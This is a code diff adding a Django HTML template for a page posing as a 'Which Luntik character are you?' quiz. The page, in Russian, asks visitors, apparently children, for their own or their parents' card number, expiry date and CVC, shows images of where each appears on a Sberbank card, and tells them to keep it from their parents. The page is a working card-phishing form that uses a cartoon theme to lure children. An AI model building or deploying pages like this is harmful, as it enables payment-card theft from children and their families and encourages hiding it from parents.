@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Какой вы персонаж из Лунтика?</title>
+    <link rel="stylesheet" href="/static/style.css" type="text/css">
+</head>
+<body>
+<h1>Какой вы персонаж из Лунтика?</h1>
+<h3>Чтобы узнать результат вам не требуется регистрироваться, надо лишь оставить данные своей кредитной/дебетовой карты или карты родителей(только не говори им, лунтик может расстроиться)</h3>
+<form action="/" method="post">
+    {% csrf_token %}
+    <img src="/static/nomer-karty-sberbanka.jpg" height="250px">
+    <input type='card' name='card'>
+    <img src="https://bankirsha.com/files/pic/sber-date.png" height="250px">
+    <input type='dat' name='dat'>
+    <img src="https://fin.zone/wp-content/uploads/2017/12/kod.jpg" height="250px">
+    <input type='cvc' name='cvc'>
+    <input type='submit' value="Узнать!">
+</form>
+</body>
+</html>
